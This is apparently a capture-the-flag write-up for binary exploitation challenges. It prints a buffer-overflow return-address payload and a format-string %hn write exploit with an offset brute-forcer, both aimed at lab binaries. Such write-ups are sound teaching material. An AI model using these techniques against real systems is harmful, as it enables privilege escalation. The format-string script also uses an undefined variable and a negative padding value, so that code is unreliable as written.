# Binary challenges

The goal of all challenges is to read the content of file flag.txt, that needs upper privileges.

## Mission0: System of a BOF

The vulnerability to exploit is a buffer overflow. The idea is to overwrite the return address with the address of function win.

In order to get the exact position of the return address I used the function cyclic from pwntools. 
The address of win can be found in gdb with the command:

```
 info address win
```

Now I have everything to craft the exploit with python:

```
win_address = "\xcb\x84\x04\x08"
offset = 144
print("pie!" + "A" * offset + win_address)
```

## Mission1: Baby ASCII Art

The vulnerability to exploit is a string format.

The general idea is to be able to execute the function cat, present in the binary, passing by arguments "flag;".

I had to craft a string format exploit to write in the return address of the printf function with the one of cat. The address of printf can be found in the binary with the command:

```
readelf -s mission1 | grep printf
```

The offset (displacement) to be used in the exploit can be easily found by writing a small script in python that uses the string format vulnerability and tries multiple values.

<pre data-overflow="wrap"><code>import subprocess
<strong>path = ['env', '-i', './mission1/mission1']
</strong>cat = "> ^ &#x3C;"
start = 1
end = 100

for i in range(start, end + 1):
	check = "AAAA%" + str(i) + "$x"

	process = subprocess.Popen(path, stdin=subprocess.PIPE, stdout=subprocess.PIPE)
	
	pay = "2\n" + check + cat + "\n" + "3\n" + "4\n" 
	output, error = process.communicate(input=pay)
	print("Testing: " + str(i) + "\tOutput: " + str(output) + "\n")

</code></pre>

have everything to craft the exploit with python:

<pre data-overflow="wrap"><code>#to enter in create_art and exploit the string format vulnerability
<strong>start = "2\n" 
</strong>#prepare the argument of cat()
win= "flag;"
#to pass the check on the selected ascii art
cat = "> ^ &#x3C;"
#string format exploit
off = 59
off_1 = off + 1
printf = "\x10\xb0\x04\x08"
printf_2 = "\x12\xb0\x04\x08"
N_1 = 0x0804 - 8 - 8
N_2 = 0x0804 - 0x8a09

exp = printf_2 + printf + "%" + str(N_1) + "c%" + str(new_off) + "$hn%" + str(N_2) + "c%" + str(off_1) + "$hn" 

#to enter in view_saved_art two times: the first one to put in place the exploit, and the second to enter in the overwritten address of printf
end = "\n 3\n 3\n 4\n"
print(start + win + exp + cat + end)

</code></pre>

## Mission2: Muda

The vulnerability is a buffer overflow. We have a buffer of 256bit, that is checked for the presence of "0x0b" or "0x05" (respectively execve and open).

The idea is to use a shellcode that open a privileged shell that does not use the previous commands.

## Mission3: ret2thefuture

## Mission4: Darkroom

It is a reverse engineering challenge: the source code is not provided.

## Mission5: 90s

## Mission6: Endianness Problem

#### Useful resources:

{% embed url="https://ir0nstone.gitbook.io/notes" %}

{% embed url="https://book.jorianwoltjer.com/" %}

